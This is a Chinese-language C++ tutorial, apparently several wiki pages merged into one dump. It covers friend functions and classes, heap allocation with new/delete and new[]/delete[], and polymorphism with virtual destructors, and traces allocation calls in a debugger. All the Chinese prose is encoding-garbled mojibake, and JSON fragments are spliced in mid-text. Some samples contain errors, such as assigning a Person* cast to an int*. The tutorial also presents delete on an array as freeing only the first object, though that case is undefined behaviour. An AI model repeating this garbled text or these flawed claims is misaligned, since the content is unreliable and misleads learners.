åœ¨C++ä¹‹åå‡ºç°çš„å…¶ä»–OOPè¯­è¨€ä¾¿åºŸå¼ƒäº†å‹å…ƒè¿™ç§ç‰¹å¾ï¼Œå¦‚Javaï¼ŒC# å‹å…ƒå‡½æ•° åœ¨ä¹‹å‰çš„å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“å¤–éƒ¨æ˜¯ä¸èƒ½ç›´æ¥è®¿é—®ç±»ä¸­çš„privateæ•°æ®ï¼Œåªèƒ½é€šè¿‡ç±»æä¾›çš„æ¥å£è¿›è¡Œè®¿é—®ã€‚ä½†å‹å…ƒå¯ä»¥ï¼Œåœ¨Personç±»ä¸­æ·»åŠ ä¸€è¡Œï¼Œå‘Šè¯‰ç¼–è¯‘å™¨void Print(const Person &amp;refPer)æ˜¯æˆ‘çš„æœ‹å‹ï¼Œäºæ˜¯ç±»å¤–çš„å‡½æ•°Printå°±èƒ½ç›´æ¥è®¿é—®Personç±»ä¸­çš„ç§æœ‰æˆå‘˜ è¯­æ³•æ ¼å¼1friend è¿”å›ç±»å‹ å‡½æ•°å(å‚æ•°åˆ—è¡¨) æ­£å¸¸æƒ…å†µåŠ ä¸Šå‹å…ƒå‡½æ•°12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;class Person&#123;private: int x; int y;public: Person(int x, int y) &#123; this-&gt;x = x; this-&gt;y = y; &#125;&#125;;void Print(const Person &amp;refPer)&#123; printf(&quot;%d &quot;, refPer.x); //ç¼–è¯‘æŠ¥é”™ï¼Œæ— æ³•è®¿é—®Personç±»çš„privateæˆå‘˜ printf(&quot;%d &quot;, refPer.y); //éœ€è¦é€šè¿‡Personç±»æä¾›çš„æ¥å£è¿›è¡Œè®¿é—®&#125;int main(int argc, char *argv[])&#123; Person p(1, 2); Print(p); return 0;&#125;123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;class Person&#123; //å£°æ˜å‹å…ƒå‡½æ•° friend void Print(const Person&amp; refPer);\t//æ”¾å“ªéƒ½è¡Œï¼Œæ”¾privateã€publicä¸‹éƒ½è¡Œ private: int x; int y;public: Person(int x, int y) &#123; this-&gt;x = x; this-&gt;y = y; &#125;&#125;;void Print(const Person &amp;refPer)&#123; printf(&quot;%d &quot;, refPer.x); //ç¼–è¯‘é€šè¿‡ printf(&quot;%d &quot;, refPer.y); //èƒ½ç›´æ¥è®¿é—®Personç±»çš„ç§æœ‰æˆå‘˜äº†&#125;int main(int argc, char *argv[])&#123; Person p(1, 2); Print(p); return 0;&#125; çŒœæµ‹Cppå‘æ˜å‹å…ƒçš„åŸå› ï¼šCppå‘æ˜æ—¶ï¼Œå·²å­˜åœ¨å¤§é‡é¢å‘è¿‡ç¨‹çš„Cä»£ç ï¼Œåƒvoid Print(const Person &amp;refPer)è¿™æ ·çš„ä»£ç æœ‰å¾ˆå¤šã€‚å¦‚æœè¦æŒ‰OOPå°è£…çš„æ€æƒ³ï¼ŒPrintè¿™æ ·çš„å‡½æ•°å°±è¡Œä¸é€šäº†ï¼Œéœ€è¦ç»™ç±»å¢åŠ ä¾›å¤–éƒ¨è®¿é—®çš„æ¥å£ï¼Œå·¥ä½œé‡å¤ªå¤§ã€‚ä¸ºäº†å…¼å®¹å·²å­˜åœ¨çš„ä»£ç ï¼ŒCppåšäº†å¦¥åï¼Œæä¾›äº†å‹å…ƒè¿™ä¸€æœºåˆ¶ï¼Œç»•è¿‡ç±»çš„è®¿é—®é™åˆ¶ï¼Œé‚£ä¹ˆç»´æŠ¤æ—§ä»£ç æ—¶å°±åªè¦åœ¨ç±»ä¸­åŠ ä¸Šå‹å…ƒçš„å£°æ˜ï¼Œè€ä»£ç å°±èƒ½ç”¨äº† ä»€ä¹ˆæƒ…å†µä¸‹éœ€è¦å‹å…ƒå‡½æ•°ï¼š è¿ç®—ç¬¦é‡è½½çš„æŸäº›åœºåˆéœ€è¦ä½¿ç”¨å‹å…ƒ ä¸¤ä¸ªç±»è¦å…±äº«æ•°æ®çš„æ—¶å€™ å‹å…ƒå‡½æ•°å’Œç±»çš„æˆå‘˜å‡½æ•°çš„åŒºåˆ«ï¼š æˆå‘˜å‡½æ•°æœ‰thisæŒ‡é’ˆï¼Œè€Œå‹å…ƒå‡½æ•°æ²¡æœ‰thisæŒ‡é’ˆ å‹å…ƒå‡½æ•°æ˜¯ä¸èƒ½è¢«ç»§æ‰¿çš„ï¼Œå°±åƒçˆ¶äº²çš„æœ‹å‹æœªå¿…æ˜¯å„¿å­çš„æœ‹å‹ å‹å…ƒç±» åŠ å¼ºç‰ˆçš„åƒåœ¾ï¼šå‹å…ƒç±»ã€‚ åœ¨MyObjectç±»ä¸­å£°æ˜TestFriendæ˜¯æˆ‘çš„æœ‹å‹ï¼Œäºæ˜¯åœ¨TestFriendç±»ä¸­å°±å¯ä»¥ç›´æ¥è®¿é—®MyObjectç±»ä¸­çš„ç§æœ‰æˆå‘˜ã€‚ ä½†æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§è®¿é—®æ˜¯å•å‘çš„ï¼ŒTestFriendå¯ä»¥è®¿é—®CObjectï¼Œä½†åä¹‹åˆ™ä¸è¡Œã€‚ 12345678910111213141516171819202122232425#include &lt;stdio.h&gt;class MyObject&#123; friend class TestFriend; //å‹å…ƒç±»å£°æ˜private: int x;public: MyObject() &#123;&#125; MyObject(int x) &#123; this-&gt;x = x; &#125;&#125;;class TestFriend&#123;public: void Fun(MyObject *c) &#123; printf(&quot;%d &quot;, c-&gt;x); //ok &#125;&#125;;"},{"title":"åœ¨å †ä¸­åˆ›å»ºå¯¹è±¡","path":"/wiki/C++/åœ¨å †ä¸­åˆ›å»ºå¯¹è±¡.html","content":"å‰è¨€ æˆ‘ä»¬å¯ä»¥åœ¨ä»€ä¹ˆåœ°æ–¹åˆ›å»ºå¯¹è±¡ï¼Ÿ å…¨å±€å˜é‡åŒº åœ¨å‡½æ•°å¤–é¢åˆ›å»ºçš„å¯¹è±¡ 1Person p; æ ˆ å‡½æ•°ä¸­åˆ›å»ºçš„å¯¹è±¡ 1234void Max()&#123; Person p;&#125; å † åœ¨å †ä¸­åˆ›å»ºçš„å¯¹è±¡ new/deleteè¯­æ³• C++å…³é”®å­—ï¼Œnew/deleteç”¨äºåˆ›å»º/é”€æ¯åœ¨å †ä¸­çš„å¯¹è±¡ 12int *p = new int; // æ²¡èµ‹åˆå€¼int *p1 = new int(5); // åˆå§‹åŒ–ä¸º5 åœ¨å †ä¸­åˆ›å»ºå¯¹è±¡ 123Person *p = new Person; // ç”¨æ— å‚æ„é€ å‡½æ•°Person *p2 = new Person(); // ç”¨æ— å‚æ„é€ å‡½æ•°Person *p2 = new Person(1, 2); // ç”¨æœ‰å‚æ„é€ å‡½æ•° é‡Šæ”¾å¯¹è±¡å ç”¨çš„ç©ºé—´ 1delete p; newå’Œdeleteçš„æ‰§è¡Œæµç¨‹ ä»£ç 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;struct Person&#123; int x; int y; Person() &#123; printf(&quot;Default constructor called... &quot;); &#125; Person(int x, int y) &#123; printf(&quot;Parameterized constructor called... &quot;); this-&gt;x = x; this-&gt;y = y; &#125; ~Person() &#123; printf(&quot;Destructor called... &quot;); &#125;&#125;;int main()&#123; Person* p = new Person(); delete p; return 0;&#125; è°ƒè¯•æ—¶æ‰¾å…³é”®callçš„æŠ€å·§1int* pi = (int*)malloc(sizeof(int)*1); æ­¥è¿›mallocï¼Œå‡è®¾mallocé‡Œæœ‰å¾ˆå¤šcallï¼Œæœ‰äº›callæ˜¯åšä¸€äº›è¾…åŠ©çš„äº‹æƒ…ï¼Œå¦‚ä½•æ‰¾åˆ°çœŸæ­£åˆ†é…å†…å­˜çš„å…³é”®callï¼Ÿ12345678;...;call A;...;call B;...;call C;...;call Dæ–¹æ³•ï¼šåœ¨Cè¯­è¨€å±‚çº§è®©è¿™æ¡è¯­å¥æ‰§è¡Œï¼Œçœ‹åˆ°piçš„å€¼æ˜¯0x3723B0hã€‚äºæ˜¯é‡æ–°è°ƒè¯•ï¼Œå†…å­˜çª—å£å®šä½åˆ°0x3723B0hï¼Œæ­¥è¿›mallocï¼Œæ­¥è¿‡call Aï¼Œè§‚å¯Ÿå†…å­˜çª—å£çš„å€¼æ˜¯å¦æœ‰å˜åŒ–å¦‚æœæœ‰ï¼Œè¯´æ˜call Aæ˜¯å…³é”®callå¦‚æœæ²¡æœ‰ï¼Œè¯´æ˜call Aä¸æ˜¯å…³é”®callï¼Œé‚£æ¥ç€è¯•call Bç›´åˆ°è¯•å‡ºæ‰§è¡ŒæŸä¸ªcallåå†…å­˜çª—å£æ•°æ®æœ‰å˜åŒ–çš„å°±æ˜¯å…³é”®callåªæ˜¯ä»¥è¿™ä¸ªä¸ºä¾‹å­ï¼Œå› ä¸ºæ¯æ¬¡é‡æ–°è°ƒè¯•åˆ†é…çš„å†…å­˜åœ°å€å¯èƒ½ä¼šå˜ æ­¥è¿›newé‡Œçœ‹æ‰§è¡Œæµç¨‹ï¼š 123456789//ç¬¬ä¸€æ­¥new-&gt; -&gt;_nh_malloc -&gt;_nh_malloc_dbg -&gt;_heap_alloc_dbg -&gt;_heap_alloc_base -&gt;HeapAllocï¼ˆä¸æ˜¯å½“å‰exeçš„äº†ï¼Œæ˜¯windowsçš„æ¨¡å—æä¾›çš„ï¼‰//ç¬¬äºŒæ­¥è°ƒç”¨æ„é€ å‡½æ•° new_nh_malloc_nh_malloc_dbg_heap_alloc_dbg_heap_alloc_baseHeapAlloc new æ„é€ å‡½æ•° ï¼ˆç¡¬ç¼–ç æˆ‘è¿™é‡Œæ²¡æ˜¾ç¤ºï¼‰ï¼Œæœ€åæ˜¯ä¸ªFFé—´æ¥callï¼Œ0042d1d8è¿™ä¸ªåœ°å€å­˜çš„æ˜¯åŠ¨æ€åº“é‡Œä¸€ä¸ªå‡½æ•°çš„åœ°å€ã€‚0042d1d8è¿™ä¸ªåœ°å€åœ¨IATè¡¨é‡Œ åŒç†ï¼Œæ­¥è¿›deleteçœ‹æ‰§è¡Œæµç¨‹ï¼š 1234567//ç¬¬ä¸€æ­¥è°ƒç”¨ææ„å‡½æ•°//ç¬¬äºŒæ­¥delete-&gt; -&gt;_free_dbg -&gt;_free_base -&gt;HeapFreeï¼ˆä¸æ˜¯å½“å‰exeçš„äº†ï¼Œæ˜¯windowsçš„æ¨¡å—æä¾›çš„ï¼‰ ä¹‹å‰åœ¨Cè¯­è¨€å­¦è¿‡mallocå’Œfreeï¼Œè·Ÿè¿›çœ‹ä¸‹å®ƒä»¬çš„æ‰§è¡Œæµç¨‹ mallocçš„ï¼š 12345malloc -&gt;_nh_malloc_dbg -&gt;_heap_alloc_dbg -&gt;_heap_alloc_base -&gt;HeapAlloc freeçš„ï¼š 1234free -&gt;_free_dbg -&gt;_free_base -&gt;HeapFree å°ç»“ 12345678910111213malloc:\tmalloc-&gt;_nh_malloc_dbg-&gt;_heap_alloc_dbg-&gt;_heap_alloc_base-&gt;HeapAlloc new:1ã€\t_nh_malloc-&gt;_nh_malloc_dbg-&gt;_heap_alloc_dbg-&gt;_heap_alloc_base-&gt;HeapAlloc2ã€ æ„é€ å‡½æ•°----------------------------------------------------------------------------free: free-&gt;_free_dbg-&gt;_free_base-&gt;HeapFreedelete:1ã€è°ƒç”¨ææ„å‡½æ•°2ã€_free_dbg-&gt;_free_base-&gt;HeapFree mallocä¸ä¼šè°ƒç”¨æ„é€ å‡½æ•°ï¼Œfreeä¸ä¼šè°ƒç”¨ææ„å‡½æ•° new=malloc+æ„é€ å‡½æ•° ç¾¤é‡Œçœ‹åˆ°çš„ï¼Œmarkï¼Œæœªæ¥è§£å†³ï¼Œnewè°ƒç”¨mallocï¼Œmallocè°ƒç”¨heapallocï¼Œheapallocè°ƒç”¨virtualallocï¼Œvirtualallocè°ƒç”¨ntç³»ç»Ÿè¿›å†…æ ¸ new[]/delete[] åˆ†åˆ«ç”¨Cå’ŒC++çš„æ–¹å¼åœ¨å †ä¸­ç”³è¯·intç±»å‹çš„æ•°ç»„ï¼š 1234567// Cæ–¹å¼ï¼Œç”¨mallocç”³è¯·ï¼Œfreeé‡Šæ”¾int* p = (int*)malloc(sizeof(int) * 10);free(p);// C++æ–¹å¼ï¼Œç”¨new[]ç”³è¯·ï¼Œdelete[]é‡Šæ”¾int* p = new int[10];delete[] p; åˆ†åˆ«ç”¨Cå’ŒC++çš„æ–¹å¼åœ¨å †ä¸­ç”³è¯·Classç±»å‹çš„æ•°ç»„ï¼š 1234567// Cæ–¹å¼ï¼Œç”¨mallocç”³è¯·ï¼Œfreeé‡Šæ”¾int* p = (Person*)malloc(sizeof(Person) * 10);free(p);// C++æ–¹å¼ï¼Œç”¨new[]ç”³è¯·ï¼Œdelete[]é‡Šæ”¾Person* p = new Person[10];delete[] p; new[]ä¼šè°ƒç”¨æ„é€ å‡½æ•°ï¼Œæ¯åˆ›å»ºä¸€ä¸ªå¯¹è±¡å°±è°ƒç”¨ä¸€æ¬¡ delete[]ä¼šä¸ºæ¯ä¸€ä¸ªè¦é”€æ¯çš„å¯¹è±¡éƒ½è°ƒç”¨ææ„å‡½æ•° deleteå’Œdelete[] ä½¿ç”¨new[]ç”³è¯·çš„å¯¹è±¡ï¼Œå´ç”¨deleteé‡Šæ”¾ 123Person* p = new Person[10];delete p; //åªä¼šé‡Šæ”¾ç¬¬ä¸€ä¸ªå¯¹è±¡ï¼Œå…¶ä»–çš„ä¸ä¼šé‡Šæ”¾ å®Œæ•´ä»£ç 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;struct Person&#123; int x; int y; Person() &#123; printf(&quot;Default constructor called... &quot;); &#125; Person(int x, int y) &#123; printf(&quot;Parameterized constructor called... &quot;); this-&gt;x = x; this-&gt;y = y; &#125; ~Person() &#123; printf(&quot;Destructor called... &quot;); &#125;&#125;;int main()&#123; Person* p = new Person[10]; delete p; //åªä¼šé‡Šæ”¾ç¬¬ä¸€ä¸ªå¯¹è±¡ï¼Œå…¶ä»–çš„ä¸ä¼šé‡Šæ”¾ return 0;&#125;"},{"title":"å¤šæ€","path":"/wiki/C++/å¤šæ€.html","content":"ç»‘å®šï¼ˆbindingï¼‰ ç»‘å®šï¼šå‡½æ•°è°ƒç”¨å¤„ä¸å‡½æ•°åœ°å€å…³è”èµ·æ¥çš„è¿‡ç¨‹ ä¾‹ ä¸‹é¢ä»£ç ä¸­void TestBound(Base* pb)å‡½æ•°çš„è¿è¡Œç»“æœæ˜¯ä»€ä¹ˆï¼Ÿ xçš„è¾“å‡ºæ˜¯å¤šå°‘ï¼Ÿ è°ƒç”¨çš„æ˜¯å“ªä¸ªFunction_1() è°ƒç”¨çš„æ˜¯å“ªä¸ªFunction_2() 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;stdio.h&gt;class Base &#123; public: int x;public: Base() &#123; x = 1; &#125; void Function_1() &#123; printf(&quot;Base::Function_1 called... &quot;); &#125; virtual void Function_2() &#123; printf(&quot;Base::Function_2 called...virtual &quot;); &#125; &#125;; class Sub:public Base &#123; public: int x; public: Sub() &#123; x = 2; &#125; void Function_1() &#123; printf(&quot;Sub::Function_1 called... &quot;); &#125; virtual void Function_2() &#123; printf(&quot;Sub::Function_2 called...virtual &quot;); &#125; &#125;; void TestBound(Base* pb) &#123; int n = pb-&gt;x; printf(&quot;%d &quot;,n); pb-&gt;Function_1(); //å‡½æ•°è°ƒç”¨ pb-&gt;Function_2(); //å‡½æ•°è°ƒç”¨ &#125; int main(int argc, char* argv[]) &#123; return 0; &#125; å›åˆ°å‰é¢æçš„ï¼Œç»‘å®šçš„è¿‡ç¨‹å°±æ˜¯å‡½æ•°è°ƒç”¨å¤„å’Œå‡½æ•°åœ°å€ç›¸å…³è”çš„è¿‡ç¨‹ã€‚ å‡½æ•°åœ°å€åœ¨ç¨‹åºç¼–è¯‘æ—¶ä¾¿èƒ½ç¡®å®šçš„ï¼Œç§°ä¸ºç¼–è¯‘æœŸç»‘å®šï¼Œåˆç§°å‰æœŸç»‘å®š/æ—©ç»‘å®š(early binding) å‡½æ•°åœ°å€åœ¨å‡½æ•°è°ƒç”¨æ—¶æ‰èƒ½ç¡®å®šçš„ï¼Œç§°ä¸ºè¿è¡ŒæœŸç»‘å®šï¼Œåˆç§°åŠ¨æ€ç»‘å®š/æ™šç»‘å®š(late binding) è§‚å¯ŸTestBoundå‡½æ•°çš„åæ±‡ç¼–ä»£ç  è§‚å¯Ÿåˆ°ï¼š xå·²ç»å…³è”å®Œäº†ï¼ŒthisæŒ‡é’ˆ+4ï¼Œå°±æ˜¯çˆ¶ç±»çš„xï¼Œxå†™æ­»äº†çš„ï¼ˆå‡½æ•°çš„å‚æ•°æ˜¯çˆ¶ç±»çš„æŒ‡é’ˆï¼Œæ— è®ºä¼ å…¥çš„æ˜¯çˆ¶ç±»å¯¹è±¡è¿˜æ˜¯å­ç±»å¯¹è±¡ï¼Œä»å¯¹è±¡å†…å­˜å¸ƒå±€ä¸Šçœ‹ï¼Œthis+4å°±æ˜¯çˆ¶ç±»çš„xï¼‰ pb-&gt;Function_1();ï¼Œå…³è”çš„å°±æ˜¯çˆ¶ç±»çš„function1ï¼ˆBase::Function_1ï¼‰ è°ƒå¯¹è±¡è™šè¡¨ä¸­çš„è™šå‡½æ•°åœ°å€ã€‚ä½†æ²¡æ³•ç¡®å®šå‡½æ•°åœ°å€ï¼Œå› ä¸ºä¼ ç»™TestBoundå‡½æ•°çš„å¯ä»¥æ˜¯çˆ¶ç±»å¯¹è±¡ï¼Œä¹Ÿå¯ä»¥æ˜¯å­ç±»å¯¹è±¡ï¼ˆä¼ å­ç±»å°±æ˜¯upcastingï¼‰ï¼Œä¼ çš„å¯¹è±¡ä¸åŒï¼Œè™šè¡¨å°±ä¸åŒï¼Œè™šè¡¨ä¸­çš„è™šå‡½æ•°åœ°å€å°±ä¸åŒã€‚è¿™é‡Œçš„ç»‘å®šéœ€è¦åœ¨ç¨‹åºè¿è¡Œæ—¶æ‰èƒ½ç¡®å®š ç­”æ¡ˆï¼š TestBoundä¼ Baseå¯¹è±¡å’ŒSubå¯¹è±¡ï¼Œä¸åŒæƒ…å†µæ—¶çš„è¾“å‡ºå¦‚ä¸‹è¡¨ Baseå¯¹è±¡ Subå¯¹è±¡ xçš„è¾“å‡º 1 1 Function_1() Base::Function_1 calledâ€¦ Base::Function_1 calledâ€¦ Function_2() Base::Function_2 calledâ€¦virtual Sub::Function_2 calledâ€¦virtual åƒFunction_2()è¿™æ ·ï¼ŒåŒæ ·ä¸€ä¸ªå‡½æ•°å´èƒ½ä½“ç°ä¸åŒçš„è¡Œä¸ºï¼Œè¿™ä¾¿æ˜¯å¤šæ€ã€‚ æ³¨æ„åªæœ‰é€šè¿‡upcatsingï¼ˆçˆ¶ç±»æŒ‡é’ˆ/å¼•ç”¨æŒ‡å‘å­ç±»å¯¹è±¡ï¼‰ä¸”è°ƒç”¨virtual functionsï¼Œæ‰æ˜¯late bindingï¼Œæ‰æ˜¯å¤šæ€ virtual functions &amp; constructors å‚è€ƒï¼šã€ŠThinking in c++ã€‹2thï¼ŒP695-701 Order of constructor calls æ„é€ å‡½æ•°çš„ä»»åŠ¡æ˜¯ç¡®ä¿å¯¹è±¡built properlyï¼ŒåŒ…æ‹¬VPTRè¢«æ­£ç¡®æŒ‡å‘proper VTABLEï¼Œæˆå‘˜å˜é‡çš„åˆå§‹åŒ–ã€‚ æ„é€ å‡½æ•°è°ƒç”¨æ¬¡åºè¦æŒ‰ç…§åŸºç±»åˆ°æœ€æ™šæ´¾ç”Ÿç±»é¡ºåºçš„ç†ç”±ï¼ˆ putting an object together piece-by-piece, first by calling the base constructor, then the more derived constructors in order of inheritanceï¼‰ï¼š å­ç±»åªèƒ½è®¿é—®åˆ°çˆ¶ç±»ä¸­publicå’Œprotectedçš„æˆå‘˜ï¼Œåªæœ‰çˆ¶ç±»çš„æ„é€ å‡½æ•°æ‰èƒ½åˆå§‹åŒ–å®ƒè‡ªå·±çš„privateæˆå‘˜ VPTRå¯èƒ½éœ€è¦æ›´æ–°ï¼šçˆ¶ç±»ä¸­æœ‰è™šå‡½æ•°æ—¶ï¼Œçˆ¶ç±»çš„æ„é€ å‡½æ•°ä¼šå°†VPTRæŒ‡å‘çˆ¶ç±»çš„VTABLEã€‚å¦‚æœå­ç±»é‡å†™äº†è™šå‡½æ•°ï¼ŒVRTPåˆå°†è®¾ç½®ä¸ºæŒ‡å‘å­ç±»çš„VTABLEï¼Œä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°æœ€åçš„æ„é€ å‡½æ•°ç»“æŸã€‚The state of the VPTR is determined by the constructor that is called last. virtual constructors? &amp; virtual functions inside constructors æ„é€ å‡½æ•°ä¸ºä»€ä¹ˆä¸èƒ½æ˜¯è™šå‡½æ•°ï¼Ÿ åŸå› ï¼šæ„é€ å‡½æ•°è´Ÿè´£å¯¹è±¡çš„åˆå§‹åŒ–ï¼Œè¿™æ—¶vptréƒ½æ²¡å»ºç«‹å®Œæˆï¼Œå¦‚ä½•å¤šæ€ï¼Ÿ å¦‚æœåœ¨æ„é€ å‡½æ•°ä¸­è°ƒç”¨è™šå‡½æ•°ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ vptræ²¡å®Œå…¨æ­£ç¡®çš„åˆå§‹åŒ–ï¼Œåœ¨åç»­çš„æ„é€ å‡½æ•°ä¸­å¯èƒ½ä¼šç»§ç»­æ›´æ–°ï¼Œè¿™æ—¶çš„è°ƒç”¨å¯èƒ½æ˜¯ç¾éš¾æ€§çš„ Destructors and virtual destructors Order of Destructor calls ä¸æ„é€ å‡½æ•°ç›¸ä¼¼ï¼Œææ„å‡½æ•°çš„å·¥ä½œæ˜¯disassemble an object that may belong to a hierarchy of classesã€‚ä½†ææ„å‡½æ•°çš„è°ƒç”¨é¡ºåºä¸æ„é€ å‡½æ•°é¡ºåºç›¸åï¼Œè¿™æ˜¯å› ä¸ºï¼š é‡Šæ”¾å·¥ä½œå…ˆç”±æ´¾ç”Ÿç±»ææ„å±äºè‡ªå·±çš„å¯¹è±¡ï¼Œç„¶åå‘ä¸Šåˆ°åŸºç±»ææ„ï¼Œè¿™æ˜¯å®‰å…¨ä¸”åˆç†çš„ï¼ˆå±äºå­ç±»çš„æˆå‘˜ææ„å®Œåï¼Œçˆ¶ç±»æˆå‘˜ä»æ˜¯æœ‰æ•ˆçš„ï¼Œå­ç±»çš„ææ„ä¸­ä»å¯ä»¥è°ƒç”¨çˆ¶ç±»çš„æˆå‘˜å‡½æ•°ï¼‰ åœ¨æ ˆä¸­çš„å¯¹è±¡åœ¨å †ä¸­çš„å¯¹è±¡ä»¥å±€éƒ¨å˜é‡ä¸ºä¾‹ï¼Œå…¨å±€å˜é‡åœ¨å…¨å±€åŒºï¼Œä¸€æ ·çš„ï¼Œç•¥ 12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;class Base &#123;public: Base() &#123; printf(&quot;Base() called &quot;); &#125; ~Base() &#123; printf(&quot;~Base() called &quot;); &#125;&#125;;class Derived : public Base &#123;public: Derived() &#123; printf(&quot;Derived() called &quot;); &#125; ~Derived() &#123; printf(&quot;~Derived() called &quot;); &#125;&#125;;int main() &#123; Derived* d = new Derived(); // åœ¨å †ä¸Šåˆ›å»ºå¯¹è±¡ delete d; // é‡Šæ”¾å¯¹è±¡ return 0;&#125; æ„é€ å‡½æ•°é¡ºåºææ„å‡½æ•°é¡ºåº newæ–¹å¼åˆ›å»ºçš„å¯¹è±¡åœ¨å †ä¸­ï¼Œç”¨deleteè¿›è¡Œé‡Šæ”¾ 12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;class Base &#123;public: Base() &#123; std::cout &lt;&lt; &quot;Base() called&quot; &lt;&lt; std::endl; &#125; ~Base() &#123; std::cout &lt;&lt; &quot;~Base() called&quot; &lt;&lt; std::endl; &#125;&#125;;class Derived : public Base &#123;public: Derived() &#123; std::cout &lt;&lt; &quot;Derived() called&quot; &lt;&lt; std::endl; &#125; ~Derived() &#123; std::cout &lt;&lt; &quot;~Derived() called&quot; &lt;&lt; std::endl; &#125;&#125;;int main() &#123; Derived *d = new Derived(); // åœ¨å †ä¸Šåˆ›å»ºå¯¹è±¡ delete d; // é‡Šæ”¾å¯¹è±¡ return 0;&#125; æ„é€ å‡½æ•°é¡ºåºææ„å‡½æ•°é¡ºåº ä½¿ç”¨deleteåˆ é™¤ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œé¦–å…ˆè°ƒç”¨è¯¥å¯¹è±¡çš„ææ„å‡½æ•°æ¥æ¸…ç†èµ„æºï¼Œç„¶åé‡Šæ”¾åˆ†é…ç»™è¯¥å¯¹è±¡çš„å†…å­˜ã€‚ virtual destructors å‚è€ƒï¼šC++ ä¸­çš„åŸºç±»ä¸ºä½•åœ¨ææ„å‡½æ•°ä¸­æ·»åŠ  virtualï¼Ÿ - å§šå†¬çš„å›ç­” - çŸ¥ä¹ å†™ä¸€ä¸ªç±»ï¼Œç±»çš„ææ„å‡½æ•°å»ºè®®å†™æˆè™šå‡½æ•°ï¼Œç¡®ä¿å½“ç”¨åŸºç±»ç±»å‹çš„æŒ‡é’ˆå»deleteä¸€ä¸ªæ´¾ç”Ÿç±»çš„å®ä¾‹çš„æ—¶å€™ï¼Œå¯ä»¥è®©æ´¾ç”Ÿç±»çš„ææ„å‡½æ•°è¢«è°ƒç”¨ã€‚ 123456789101112class Base&#123; virtual ~Base() &#123;&#125;&#125;;class Derived : public Base&#123; ~Derived() &#123;&#125;&#125;;Base *p = new Derived();delete p; è¿™ä¸ªæƒ…å†µå‘ç”Ÿåœ¨ä¸€ä¸ªç±»è¢«ç»§æ‰¿ï¼Œç„¶åå¼€å‘è€…ä¼šå†™å¤šæ€çš„ä»£ç ï¼ˆupcasting + newæ–¹å¼çš„å¯¹è±¡ï¼‰ï¼Œä½†é‡Šæ”¾æ—¶å¦‚æœçˆ¶ç±»çš„ææ„å‡½æ•°ä¸æ˜¯è™šå‡½æ•°ï¼Œé‡Šæ”¾å¯¹è±¡æ—¶åªä¼šè°ƒç”¨çˆ¶ç±»çš„ææ„å‡½æ•°ï¼Œè¿™æ ·å°±åªé‡Šæ”¾æ‰çˆ¶ç±»å¯¹è±¡çš„å†…å­˜ï¼Œè€Œå­ç±»å¯¹è±¡ç›¸æ¯”äºçˆ¶ç±»å¤šå‡ºæ¥çš„é‚£éƒ¨åˆ†å¹¶æ²¡æœ‰é‡Šæ”¾æ‰ã€‚ å¯¹è±¡åœ¨å †æ ˆæˆ–å…¨å±€å˜é‡åŒºæ˜¯æ²¡è¿™ä¸ªé—®é¢˜çš„ï¼Œå½“å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸç»“æŸæ—¶ï¼ˆå¦‚å‡½æ•°è¿”å›ï¼Œæˆ–ï¼Œç¨‹åºç»“æŸï¼‰ï¼Œå¯¹è±¡é”€æ¯æ—¶ï¼Œå®ƒä»¬çš„ææ„å‡½æ•°ä¼šæŒ‰ç…§æ­£ç¡®çš„é¡ºåºæ‰§è¡Œï¼ˆå…ˆæ´¾ç”Ÿç±»ï¼ŒååŸºç±»ï¼‰ ä¾‹ æ„é€ å‡½æ•°é¡ºåºï¼šBase()-&gt;Derived() ææ„å‡½æ•°é¡ºåºï¼š~Derived()-&gt;~Base() éè™šææ„å‡½æ•°è™šææ„å‡½æ•°12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;class Base &#123;public: Base() &#123; printf(&quot;Base() called &quot;); &#125; ~Base() &#123; printf(&quot;~Base() called &quot;); &#125;&#125;;class Derived : public Base &#123;public: Derived() &#123; printf(&quot;Derived() called &quot;); &#125; ~Derived() &#123; printf(&quot;~Derived() called &quot;); &#125;&#125;;int main() &#123; Base* p = new Derived(); // çˆ¶ç±»æŒ‡é’ˆæŒ‡å‘å­ç±»å¯¹è±¡ delete p; // é‡Šæ”¾æ—¶åªä¼šè°ƒç”¨çˆ¶ç±»çš„ææ„ return 0;&#125; åªè°ƒç”¨äº†~Base() è·Ÿè¿›deleteçš„åæ±‡ç¼–çœ‹ä»€ä¹ˆæƒ…å†µã€‚ å‰é¢newå¾—åˆ°ä¸€ä¸ªå †ä¸­çš„å†…å­˜åœ°å€ï¼Œç”¨eaxå­˜åˆ°å±€éƒ¨å˜é‡åŒº[ebp-18h]ï¼Œå°†[ebp-18h]ä½œä¸ºthisæŒ‡é’ˆä¼ ç»™æ„é€ å‡½æ•°è¿›è¡Œåˆå§‹åŒ–ã€‚ delelteæ—¶ä¹Ÿæ˜¯ä¼ è¿™å†…å­˜ç¼–å·ï¼Œpush 1çŒœæ˜¯å› ä¸ºåªæœ‰1ä¸ªå¯¹è±¡è¦é”€æ¯ï¼Œå¦‚æœdelete []è¦ç®—ä¸€å…±å¤šå°‘ä¸ªå¯¹è±¡ ä½¿ç”¨deleteåˆ é™¤ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œé¦–å…ˆè°ƒç”¨è¯¥å¯¹è±¡çš„ææ„å‡½æ•°æ¥æ¸…ç†èµ„æºï¼Œç„¶åé‡Šæ”¾åˆ†é…ç»™è¯¥å¯¹è±¡çš„å†…å­˜ã€‚ å› ä¸ºæ˜¯Base*ç±»å‹æŒ‡é’ˆï¼Œè¿™é‡Œä¼ thisæŒ‡é’ˆç„¶åè°ƒç”¨Baseç±»çš„ææ„å‡½æ•° 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;stdio.h&gt;class Base&#123;private: int x;public: Base() &#123; x = 1; printf(&quot;Base() called &quot;); &#125; virtual ~Base() &#123; printf(&quot;~Base() called &quot;); &#125;&#125;;class Derived 